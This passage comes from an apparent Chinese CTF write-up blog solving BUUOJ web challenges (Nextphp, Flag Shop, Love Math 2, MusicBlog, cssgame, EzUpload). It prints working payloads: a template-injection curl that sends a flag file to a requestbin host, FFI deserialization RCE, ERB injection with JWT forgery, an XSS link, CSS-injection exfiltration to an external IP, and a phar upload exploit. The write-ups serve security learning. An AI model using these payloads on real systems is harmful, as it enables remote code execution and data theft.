http:&#x2F;&#x2F;http.requconfigestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure><p>过滤之后最终的脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-05-RCTF-2019-Nextphp"><a href="#0x-05-RCTF-2019-Nextphp" class="headerlink" title="0x 05 [RCTF 2019]Nextphp"></a>0x 05 [RCTF 2019]Nextphp</h3><ul><li><p>考点</p><p>php7.4新版本特性</p></li><li><p>解题过程</p></li></ul><ol><li>查看php配置信息，版本是7.4，同时发现过滤了大多数系统函数</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224651185.png" alt></p><ol start="2"><li>没有过滤scandir函数，payload:<code>?a=var_dump(scandir(&#39;/var/www/html&#39;));</code></li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224810734.png" alt></p><ol start="3"><li>利用file_get_contents()查看preload.php源码，payload：<code>a=echo file_get_contents(&#39;preload.php&#39;);</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;print_r&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;1&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码是：PHP7.4新特性：新的自定义对象序列化机制：<a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">关于<strong>serialize和</strong>unserialize</a></p><ol start="4"><li>观察代码，发现对象反序列化时会执行run()方法</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时发现可以结合__get魔法函数，获取对象data数组中的元素值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>根据题目文件名称提示关注php7.4的新特性，关于<code>opcache.preload</code>，参考这篇文章<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload</a> 可知</li></ol><blockquote><p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> 是 <strong>PHP7.4</strong> 中新加入的功能。如果设置了 <a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> ，那么在所有Web应用程序运行之前，服务会先将设定的 <strong>preload</strong> 文件加载进内存中，使这些 <strong>preload</strong> 文件中的内容对之后的请求均可用。</p></blockquote><p>在这篇文档尾巴可以看到如下描述：</p><blockquote><p>In conjunction with ext/FFI (dangerous extension), we may allow FFI  functionality only in preloaded PHP files, but not in regular ones</p></blockquote><p>大概意思就是说允许在 <strong>preload</strong> 文件中使用 <strong>FFI</strong> 拓展，但是文档中说了 <strong>FFI</strong> 是一个危险的拓展，而这道题目却开启了 <strong>FFI</strong> 拓展。</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;FFI::cdef&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;int system(const char *command);&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;$a%3dunserialize(&#39;C%3A1%3A%22A%22%3A95%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A32%3A%22int+system%28const+char+%2Acommand%29%3B%22%3B%7D%7D&#39;)-&gt;ret;var_dump($a-&gt;system(&quot;cat%20&#x2F;flag&gt;b.txt&quot;));</span><br></pre></td></tr></table></figure><p>最后访问b.txt得到flag</p><p>参考资料：</p><blockquote><p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp</a></p><p><a href="https://blog.csdn.net/qq_41809896/article/details/90384668" target="_blank" rel="noopener">https://blog.csdn.net/qq_41809896/article/details/90384668</a></p><p><a href="https://cjm00n.top/CTF/buuoj-writeup-2.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/buuoj-writeup-2.html</a></p></blockquote><h3 id="0x-06-SCTF2019-Flag-Shop"><a href="#0x-06-SCTF2019-Flag-Shop" class="headerlink" title="0x 06 [SCTF2019]Flag Shop"></a>0x 06 [SCTF2019]Flag Shop</h3><ul><li><p>考点</p><p>erb模版注入</p></li><li><p>解题过程</p></li></ul><ol><li><p>页面打开是一个购买flag的页面，flag需要1e+27个JinKela才能购买，数量不够。访问robots.txt发现filebak目录，访问得到页面源代码</p></li><li><p>审计代码发现</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">get &quot;&#x2F;work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;</span><br><span class="line">  auth &#x3D; auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;</span><br><span class="line">    cookies[:auth] &#x3D; auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>如果传入的do参数和name参数一致，会输出<code>{params[:name][0,7]} working successfully!</code></p><p>但是限制了只能输入7个字符，除去&lt;%==&gt;只有两个字符可以利用，这时可以利用ruby全局变量$&amp;，可以获得上一次正则匹配的结果</p><p>payload：<code>/work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414232933574.png" alt></p><p>成功拿到secret,接着伪造cookie</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233126939.png" alt></p><p>回到页面，buy flag，抓包将伪造的cookie写进去，在返回的包里拿到新的cookie，解密得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233252575.png" alt></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233323947.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md" target="_blank" rel="noopener">https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md</a></p></blockquote><h3 id="0x-07-NESTCTF-2019-Love-Math-2"><a href="#0x-07-NESTCTF-2019-Love-Math-2" class="headerlink" title="0x 07 [NESTCTF 2019]Love Math 2"></a>0x 07 [NESTCTF 2019]Love Math 2</h3><ul><li><p>考点</p><p>php动态特性捕捉</p></li><li><p>解题过程</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload &#x3D; [‘abs‘, ‘acos‘, ‘acosh‘, ‘asin‘, ‘asinh‘, ‘atan2‘, ‘atan‘, ‘atanh‘,  ‘bindec‘, ‘ceil‘, ‘cos‘, ‘cosh‘, ‘decbin‘ , ‘decoct‘, ‘deg2rad‘, ‘exp‘, ‘expm1‘, ‘floor‘, ‘fmod‘, ‘getrandmax‘, ‘hexdec‘, ‘hypot‘, ‘is_finite‘, ‘is_infinite‘, ‘is_nan‘, ‘lcg_value‘, ‘log10‘, ‘log1p‘, ‘log‘, ‘max‘, ‘min‘, ‘mt_getrandmax‘, ‘mt_rand‘, ‘mt_srand‘, ‘octdec‘, ‘pi‘, ‘pow‘, ‘rad2deg‘, ‘rand‘, ‘round‘, ‘sin‘, ‘sinh‘, ‘sqrt‘, ‘srand‘, ‘tan‘, ‘tanh‘];</span><br><span class="line">for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j &#x3D; 0;$j &lt;&#x3D;9;$j++)&#123;</span><br><span class="line">            $exp &#x3D; $payload[$k] ^ $i.$j;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;&lt;command&gt;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.cnblogs.com/yesec/p/12664136.html" target="_blank" rel="noopener">https://www.cnblogs.com/yesec/p/12664136.html</a></p></blockquote><h3 id="0x-08-Zer0pts2020-Can-you-guess-it"><a href="#0x-08-Zer0pts2020-Can-you-guess-it" class="headerlink" title="0x 08 [Zer0pts2020]Can you guess it?"></a>0x 08 [Zer0pts2020]Can you guess it?</h3><ul><li><p>考点</p><p>正则污染绕过、代码审计</p></li><li><p>解题过程</p></li></ul><ol><li>打开题目访问源代码进行审计</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$_SERVER[&#39;PHP_SELF&#39;]表示当前php文件相对于网站根目录的位置地址</span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); &#x2F;&#x2F;basename() 函数返回路径中的文件名部分</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret &#x3D; bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#39;guess&#39;])) &#123;</span><br><span class="line">  $guess &#x3D; (string) $_POST[&#39;guess&#39;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message &#x3D; &#39;Wrong.&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>问题出在了basename()函数可以跨目录读取文件，但是需要绕过正则，这里可以用污染绕过，贴一下y1ng师傅的fuzz脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import requests</span><br><span class="line">for i in range (0,500):</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;814589eb-4094-4449-bf79-39388aa86610.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;&#123;&#125;?source&#39;.format(hex(i).replace(&#39;0x&#39;, &#39;%&#39;))</span><br><span class="line">r &#x3D; requests.get(url)</span><br><span class="line">print(url)</span><br><span class="line">if r&quot;flag&quot; in r.text:</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure><p>可以fuzz出很多可以用的参数</p><h3 id="0x-09-Zer0pts2020-musicblog"><a href="#0x-09-Zer0pts2020-musicblog" class="headerlink" title="0x 09 [Zer0pts2020]musicblog"></a>0x 09 [Zer0pts2020]musicblog</h3><ul><li><p>考点</p><p>代码设计、XSS bypass</p></li><li><p>解题过程</p></li></ul><ol><li><p>下载题目附件进行审计，在work.js中发现存在flag且设置在浏览器UA中，后台机器人会点击<code>#like</code>标签<img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420224644867.png" alt></p></li><li><p>审计<code>utli.php</code>发现</p></li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420225324470.png" alt></p><p>字符串会被加载到<code>&lt;audio&gt;</code>标签并解析到页面，输入的内容经过一次strip_tags处理。</p><p>没有过滤其他内容，可以在``中插入任意内容，但是受CSP-nonce的限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$nonce &#x3D; get_nonce();</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39;; base-uri &#39;none&#39;; trusted-types&quot;);</span><br><span class="line">header(&#39;X-Frame-Options: DENY&#39;);</span><br><span class="line">header(&#39;X-XSS-Protection: 1; mode&#x3D;block&#39;);</span><br></pre></td></tr></table></figure><p>而这个<code>strip_tags()</code>存在bug:<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420230614404.png" alt></p><p><img src="http://static.zybuluo.com/1160307775/5vrpxpsvcopf7bucy1q2y4h1/image_1e2uhu2v810fc1l7ppa4l41mqm20.png" alt="image_1e2uhu2v810fc1l7ppa4l41mqm20.png-53.5kB"></p><p>MusicBlog 中使用的是<code>&lt;audio&gt;</code>作为白名单，<code>&lt;a/udio&gt;</code>可以通过函数处理，并且<code>&lt;a/udio&gt;</code>会作为 超链接<code>&lt;a&gt;</code>被解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;</span><br></pre></td></tr></table></figure><p>经过处理后展开是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls src&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog" target="_blank" rel="noopener">https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog</a></p><p><a href="https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/" target="_blank" rel="noopener">https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/</a></p></blockquote><h3 id="0x-10-安洵杯-2019-cssgame"><a href="#0x-10-安洵杯-2019-cssgame" class="headerlink" title="0x 10 [安洵杯 2019]cssgame"></a>0x 10 [安洵杯 2019]cssgame</h3><ul><li><p>考点</p><p>CSS注入</p></li><li><p>解题过程</p></li></ul><ol><li>打开靶机，显示界面如下：</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222257298.png" alt></p><p>右键查看源代码发现：</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222412267.png" alt></p><p>可以看到flag的值就在标签<code>&lt;input&gt;</code>的<code>value</code>属性</p><p>然后我们通过靶机发送<code>css</code>参数给内网的flag.html，flag.html接收后将<code>css</code>拼接到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;$&#123;encodeURI(req.query.css)&#125;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>通过<strong>css injection</strong>来窃取内网flag值，这里可以参考微笑师傅的文章：<a href="https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/" target="_blank" rel="noopener">https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/</a></p><p>构造exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;poc.css&quot;, &quot;w&quot;)</span><br><span class="line">dic &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;</span><br><span class="line">for i in dic:</span><br><span class="line">    flag &#x3D; sys.argv[1] + i</span><br><span class="line">    payload &#x3D; &quot;input[name&#x3D;flag][value^&#x3D;\&quot;&quot; + flag + &quot;\&quot;] ~ * &#123;background-image: url(\&quot;http:&#x2F;&#x2F;174.0.108.172:8080&#x2F;?&quot; + flag + &quot;\&quot;);&#125;&quot;</span><br><span class="line">    f.write(payload + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>将<code>css=http://174.0.108.172/poc.css</code>post给<code>crawl.html</code>,在nc监听中可以得到flag</p><p>这里环境问题数据可能会传不到内网，需要不停的发包直至收到nc收到请求的信息，坑了我一上午，我裂开了</p><p>参考资料：</p><blockquote><p><a href="https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/" target="_blank" rel="noopener">https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/</a></p></blockquote><h3 id="0x-11-D3CTF-2019-EzUpload"><a href="#0x-11-D3CTF-2019-EzUpload" class="headerlink" title="0x 11 [D3CTF 2019]EzUpload"></a>0x 11 [D3CTF 2019]EzUpload</h3><ul><li><p>考点</p><p>文件上传、反序列化</p></li><li><p>解题过程</p></li></ul><ol><li>题目给了源代码，首先进行审计，发现接受三个参数将文件写入，同时对输入的进行了检查</li></ol><p><code>checkdir()</code>检查了<code>$this-&gt;userdir</code>，</p><p><code>checkurl()</code>禁止了url出现<code>php|file</code>，防止使用两种伪协议读取本地文件，除了vps上设置文件还可以使用<code>data://</code>协议</p><p><code>checkext()</code>禁止了<code>filename</code>出现<code>..</code>、<code>/</code>、<code>ph</code>，可以联想到使用.htaccess，但是对内容进行了过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&quot;&#x2F;\&lt;\?|value|on|type|flag|auto|set|\\\\&#x2F;i&quot;, $content))&#123;</span><br><span class="line">die(&#39;hacker!!!&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以参考：<a href="https://www.freebuf.com/vuls/218495.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218495.html</a></p><p>传入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure><p>另外有一个问题是<code>__destruct</code>这个魔术方法，如果序列化对象的时候触发，当前的工作路径是根目录<code>/</code>,因此没有写入权限</p><p>第一步，寻找phar反序列化触发点，可以通过<code>upload()</code>方法中的 <code>$content = file_get_contents($this-&gt;url,NULL,NULL,0,2048);</code></p><p>第二步，获取<code>upload/</code>目录的绝对路径，可以通过<code>__destruct()</code>中的 <code>echo $string;</code> 触发<code>__toString()</code>，打印<code>__DIR__</code></p><p>payload1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dir&#123;</span><br><span class="line">    public $userdir;</span><br><span class="line">    public $url;</span><br><span class="line">    public $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d &#x3D; new dir();</span><br><span class="line">$d-&gt;userdir &#x3D; new dir();</span><br><span class="line">$d-&gt;userdir-&gt;userdir &#x3D; &quot;..&#x2F;&quot;;</span><br><span class="line">echo urlencode(serialize($d));</span><br><span class="line">$phar &#x3D; new Phar(&quot;1.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89A&quot;.&quot;__HALT_COMPILER();&quot;); &#x2F;&#x2F;设置stub，增加gif文件头用以欺骗检测</span><br><span class="line">$phar-&gt;setMetadata($d); 